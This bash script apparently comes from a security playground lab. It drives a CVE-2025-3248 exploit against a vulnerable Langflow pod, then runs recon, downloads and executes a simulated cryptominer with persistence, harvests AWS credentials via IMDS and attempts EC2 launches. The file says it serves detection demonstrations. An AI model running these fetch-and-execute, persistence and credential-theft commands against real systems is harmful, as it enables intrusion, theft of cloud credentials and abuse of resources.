#!/usr/bin/env bash
#
# Educational Security Simulation - Langflow CVE-2025-3248 RCE -> malware +
# cloud credential theft.
#
# Unlike the other scenarios (rce-malware, cloud-access, bpfdoor, ...) this
# one does NOT run inside the playground-app pod against the synthetic
# /inject endpoint. It runs from the attacker's laptop and drives a REAL
# exploit -- CVE-2025-3248 (unauthenticated RCE via POST /api/v1/validate/code
# on Langflow < 1.3.0) -- against the langflow-vulnerable pod. Every command
# below is executed *on the langflow pod* through that exploit, so the
# downstream payloads (rce-malware/payload.sh, cloud-access scripts) are the
# same ones the other scenarios use, just delivered through a real CVE instead
# of the /inject shim.
#
# Usage:
#   ./detonate.sh                         # auto-run against http://langflow-demo:7860
#   ./detonate.sh --wait                  # step-by-step, press Enter to advance
#   ./detonate.sh --target http://host:7860 --wait
#   ./detonate.sh --silent                # no talk-track, exploit output suppressed
#   ./detonate.sh --ref <git-sha-or-branch>   # pin payload downloads to a git ref (default: main)
#   ./detonate.sh --exploit /path/to/CVE-2025-3248.py
#
# Prerequisites (run on the attacker machine before this script):
#   - python3 + the `requests` package (for the exploit)
#   - kubectl port-forward -n playground deployment/langflow-vulnerable 7860:7860
#   - an /etc/hosts entry mapping `langflow-demo` to 127.0.0.1 (or use --target)
#   Recon commands (nmap, httpx, nuclei) are run only if installed.

set -u

# ----------------------------------------------------------------------------
# Colors
# ----------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# ----------------------------------------------------------------------------
# Defaults / globals
# ----------------------------------------------------------------------------
WAIT_FOR_CONFIRM=false
SILENT_MODE=false
STEP=1
TARGET="${LANGFLOW_TARGET:-http://langflow-demo:7860}"
PLAYGROUND_REF="${PLAYGROUND_REF:-main}"

# Resolve repo root from this script's location (scenarios/langflow-rce/ -> ../..)
REPO_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
EXPLOIT="${CVE_EXPLOIT:-${REPO_ROOT}/assets/langflow-rce/CVE-2025-3248.py}"

RAW_BASE="https://raw.githubusercontent.com/DataDog/datadog-security-playground/${PLAYGROUND_REF}"

# ----------------------------------------------------------------------------
# Help
# ----------------------------------------------------------------------------
show_help() {
    cat <<EOF
Usage: $0 [OPTIONS]

Drive the CVE-2025-3248 Langflow RCE exploit from the attacker machine, then
chain the rce-malware and cloud-access payloads onto the langflow pod.

OPTIONS:
  -w, --wait              Wait for Enter between each step
  -s, --silent            No talk-track; exploit output suppressed
  -t, --target URL        Langflow target URL (default: $TARGET)
  -r, --ref REF           Git ref for payload downloads (default: $PLAYGROUND_REF)
  -e, --exploit PATH      Path to CVE-2025-3248.py (default: $EXPLOIT)
  -h, --help              Show this help message

EXAMPLES:
  $0 --wait
  $0 --target http://localhost:7860 --wait
  $0 --ref $(git rev-parse --short HEAD 2>/dev/null || echo main)
EOF
}

# ----------------------------------------------------------------------------
# Arg parsing
# ----------------------------------------------------------------------------
parse_args() {
    while [ $# -gt 0 ]; do
        case "$1" in
            -w|--wait)      WAIT_FOR_CONFIRM=true; shift ;;
            -s|--silent)    SILENT_MODE=true; shift ;;
            -t|--target)    TARGET="$2"; shift 2 ;;
            -r|--ref)       PLAYGROUND_REF="$2"; shift 2 ;;
            -e|--exploit)   EXPLOIT="$2"; shift 2 ;;
            -h|--help)      show_help; exit 0 ;;
            *) echo "Unknown option: $1" >&2; show_help; exit 1 ;;
        esac
    done
    # Re-resolve RAW_BASE in case --ref changed it
    RAW_BASE="https://raw.githubusercontent.com/DataDog/datadog-security-playground/${PLAYGROUND_REF}"
    if [ "$SILENT_MODE" = "true" ]; then
        WAIT_FOR_CONFIRM=false
    fi
}

# ----------------------------------------------------------------------------
# Helpers (mirroring scripts/tool.sh conventions)
# ----------------------------------------------------------------------------
wait_for_confirmation() {
    if [ "$WAIT_FOR_CONFIRM" = "true" ]; then
        echo ""
        printf '%b\n' "${YELLOW}Press Enter to continue to the next step, or Ctrl+C to exit...${NC}"
        read -r dummy
        echo ""
    fi
}

print() {
    if [ "$SILENT_MODE" = "false" ]; then
        while IFS= read -r line; do
            printf '%b\n' "$line"
        done
        echo
    fi
}

step() {
    if [ "$SILENT_MODE" = "true" ]; then
        STEP=$(( STEP + 1 ))
    else
        if [ "$STEP" = 1 ]; then
            printf '%b\n' "${BLUE}# Attack steps${NC}"
            echo
        fi
        printf '%b\n' "${GREEN}## Step $STEP${NC}"
        STEP=$(( STEP + 1 ))
        echo
        print
    fi
}

# Run a command on the langflow pod through the CVE-2025-3248 exploit.
# Mirrors the inject() helper from scripts/tool.sh but uses the real exploit
# instead of the synthetic /inject endpoint.
exploit() {
    local cmd="$1"
    if [ "$SILENT_MODE" = "true" ]; then
        python3 "$EXPLOIT" --quiet "$TARGET" "$cmd" >/dev/null 2>&1
    else
        printf '%b\n' "${BLUE}Executing via CVE-2025-3248 exploit...${NC}"
        echo
        printf '%b\n' "${CYAN}\`\`\`${NC}"
        printf '%b\n' "${YELLOW}$ python3 CVE-2025-3248.py \"$TARGET\" \"$cmd\"${NC}"
        printf '%b\n' "${CYAN}\`\`\`${NC}"
        echo
        python3 "$EXPLOIT" --quiet "$TARGET" "$cmd"
        echo
    fi
}

# Run a recon tool if it is installed; otherwise print a skip notice so the
# demo narrative still flows.
recon() {
    local tool="$1"; shift
    if [ "$SILENT_MODE" = "true" ]; then
        command -v "$tool" >/dev/null 2>&1 && "$tool" "$@" >/dev/null 2>&1
        return
    fi
    printf '%b\n' "${BLUE}Running $tool...${NC}"
    echo
    printf '%b\n' "${CYAN}\`\`\`${NC}"
    printf '%b\n' "${YELLOW}$ $tool $*${NC}"
    printf '%b\n' "${CYAN}\`\`\`${NC}"
    echo
    if command -v "$tool" >/dev/null 2>&1; then
        "$tool" "$@"
    else
        printf '%b\n' "${YELLOW}[skip] '$tool' is not installed on this machine -- skipping this recon step.${NC}"
    fi
    echo
}

# ----------------------------------------------------------------------------
# Pre-flight checks
# ----------------------------------------------------------------------------
preflight() {
    local missing=0
    if ! command -v python3 >/dev/null 2>&1; then
        printf '%b\n' "${RED}[!] python3 is required to run the CVE-2025-3248 exploit.${NC}" >&2
        missing=1
    fi
    if ! python3 -c "import requests" >/dev/null 2>&1; then
        printf '%b\n' "${RED}[!] The python 'requests' package is required. Install it with: pip install requests${NC}" >&2
        missing=1
    fi
    if [ ! -f "$EXPLOIT" ]; then
        printf '%b\n' "${RED}[!] Exploit script not found: $EXPLOIT${NC}" >&2
        echo "    Pass --exploit /path/to/CVE-2025-3248.py or set CVE_EXPLOIT." >&2
        missing=1
    fi
    if [ "$missing" -ne 0 ]; then
        exit 1
    fi
}

# ============================================================================
# Main
# ============================================================================
parse_args "$@"
preflight

print <<EOF
${PURPLE}# Educational Security Simulation - Langflow CVE-2025-3248 RCE${NC}

${YELLOW}WARNING: This is a SIMULATION for demonstration purposes only!${NC}

${PURPLE}This demonstration exploits a real vulnerability -- CVE-2025-3248,
unauthenticated remote code execution in Langflow < 1.3.0 (POST
/api/v1/validate/code) -- against the langflow-vulnerable pod. Once code
execution is achieved, the same downstream payloads used by the rce-malware
and cloud-access scenarios are delivered through the exploit: a simulated
cryptominer with persistence, then AWS credential theft via IMDS and an
attempted EC2 pivot.

This showcases the full kill chain an AI-enabled attacker can automate against
an exposed, vulnerable workload: discover, exploit, deploy malware, harvest
cloud credentials, and attempt lateral movement.${NC}

${YELLOW}The malware used in this simulation is FAKE and HARMLESS.${NC}

${PURPLE}Target:   $TARGET
Exploit:   $EXPLOIT
Ref:       $PLAYGROUND_REF${NC}
EOF

# ----------------------------------------------------------------------------
# Phase 0 - Reconnaissance / discovery
# ----------------------------------------------------------------------------
step <<EOF
${PURPLE}Reconnaissance - Port discovery with nmap${NC}

${PURPLE}An attacker starts by discovering exposed services. nmap scans the
common playground ports and performs light service detection. AI-enabled
attackers automate and parallelize this discovery at a scale no manual operator
can match, quickly identifying workloads worth compromising.${NC}

${PURPLE}This example targets a known, recently-disclosed CVE -- but it could
just as easily be a zero day the attacker found and weaponized.${NC}
EOF
wait_for_confirmation
# Host is the part of $TARGET without scheme/port; for the default
# http://langflow-demo:7860 we scan the host `langflow-demo`.
RECON_HOST="${TARGET#http://}"
RECON_HOST="${RECON_HOST#https://}"
RECON_HOST="${RECON_HOST%%:*}"
recon nmap -p 7860,3000,8000 -sV --script http-title -oG - "$RECON_HOST"

step <<EOF
${PURPLE}Reconnaissance - Confirm Langflow with httpx${NC}

${PURPLE}An open port is not enough -- the attacker confirms the service is
actually Langflow (not just any open port) and fingerprints the technology
stack so the right exploit can be selected.${NC}
EOF
wait_for_confirmation
recon httpx -u "$RECON_HOST" -p 7860 -title -tech-detect -status-code -silent

step <<EOF
${PURPLE}Reconnaissance - Vulnerability confirmation with nuclei${NC}

${PURPLE}nuclei pins the confirmed host against the exact CVE template
(CVE-2025-3248), turning a suspicion into a verified, exploitable finding.${NC}
EOF
wait_for_confirmation
recon nuclei -id CVE-2025-3248 -u "$TARGET"

# ----------------------------------------------------------------------------
# Phase 1 - Exploit sanity checks
# ----------------------------------------------------------------------------
step <<EOF
${PURPLE}Exploit - Sanity check (whoami)${NC}

${PURPLE}Before committing to the full chain, the attacker verifies the exploit
works and reflects command output back through the vulnerable endpoint.${NC}
EOF
wait_for_confirmation
exploit "whoami"

step <<EOF
${PURPLE}Exploit - Sanity check (filesystem enumeration)${NC}

${PURPLE}A quick directory listing confirms the execution context and what is
reachable from inside the compromised pod.${NC}
EOF
wait_for_confirmation
exploit "ls -al /"

step <<EOF
${PURPLE}Exploit - Sanity check (expected failure)${NC}

${PURPLE}Running a garbage command confirms the exploit faithfully reflects
stderr too -- the attacker knows they have reliable, observable command
execution.${NC}
EOF
wait_for_confirmation
exploit "asdkjasldjk"

# ----------------------------------------------------------------------------
# Phase 2 - Tooling
# ----------------------------------------------------------------------------
step <<EOF
${PURPLE}Tool Installation - Install curl on the compromised pod${NC}

${PURPLE}curl is needed to download the downstream payloads from GitHub. The
langflow-vulnerable image already bakes curl, but the attacker cannot assume
that -- so they ensure it is present before pulling the malware.${NC}
EOF
wait_for_confirmation
exploit "apt update && apt install -y curl && echo SUCCESS"

# ----------------------------------------------------------------------------
# Phase 3 - Malware download & execution (same payload as rce-malware)
# ----------------------------------------------------------------------------
step <<EOF
${PURPLE}Payload Download & Execute - Deploy simulated cryptominer${NC}

${PURPLE}Through the exploit, the attacker pulls the rce-malware payload.sh
from the playground repo and runs it. The payload downloads a simulated
cryptominer, establishes persistence (SSH authorized_keys + rc.common), and
launches the miner with an LD_PRELOAD library that issues DNS queries to
mining-pool domains -- generating the runtime signals a SOC would pivot on.${NC}
EOF
wait_for_confirmation
exploit "curl -O ${RAW_BASE}/assets/rce-malware/payload.sh && chmod +x payload.sh && ./payload.sh && echo SUCCESS"

# ----------------------------------------------------------------------------
# Phase 4 - Cloud credential theft (same payload as cloud-access)
# ----------------------------------------------------------------------------
step <<EOF
${PURPLE}Credential Theft - Harvest AWS creds via IMDS${NC}

${PURPLE}With code execution on the pod, the attacker pivots to the cloud:
the retrieve-creds-via-imds.sh script hits the Instance Metadata Service
(169.254.169.254) to steal the node's IAM role credentials and stages them
for reuse. The raw IMDS requests are visible to runtime security monitoring.${NC}
EOF
wait_for_confirmation
exploit "curl -O ${RAW_BASE}/assets/cloud-access/retrieve-creds-via-imds.sh && chmod +x retrieve-creds-via-imds.sh && ./retrieve-creds-via-imds.sh"

step <<EOF
${PURPLE}Lateral Movement - Attempt EC2 launch with stolen creds${NC}

${PURPLE}The attacker reuses the harvested credentials to attempt launching
expensive EC2 instances across multiple regions (run-instances-with-creds.sh).
An invalid AMI id is used so the launches fail -- but the CloudTrail
RunInstances events are still generated, giving investigators a trail to
follow and a credential to contain.${NC}
EOF
wait_for_confirmation
exploit "curl -O ${RAW_BASE}/assets/cloud-access/run-instances-with-creds.sh && chmod +x run-instances-with-creds.sh && ./run-instances-with-creds.sh"

# ----------------------------------------------------------------------------
# Phase 5 - Cleanup
# ----------------------------------------------------------------------------
step <<EOF
${PURPLE}Cleanup - Remove attack artifacts${NC}

${PURPLE}Terminate any remaining malware processes and remove the downloaded
scripts so the compromised pod is clean after the demonstration.${NC}
EOF
wait_for_confirmation
exploit "pkill -f 'malware' || true; rm -f /tmp/malware /var/www/html/malware payload.sh preload.so retrieve-creds-via-imds.sh run-instances-with-creds.sh /tmp/.aws-cloud-access-creds 2>/dev/null || true; sed -i '/malware/d' /etc/rc.common 2>/dev/null || true; sed -i '/FAKE+DEMO/d' ~/.ssh/authorized_keys 2>/dev/null || true; echo CLEANED"

print <<EOF
${GREEN}Demonstration simulation completed successfully! The full kill chain --
recon, CVE-2025-3248 exploit, malware deployment, cloud credential theft and
attempted lateral movement -- has run against the langflow-vulnerable pod, and
all artifacts have been cleaned up.${NC}
EOF
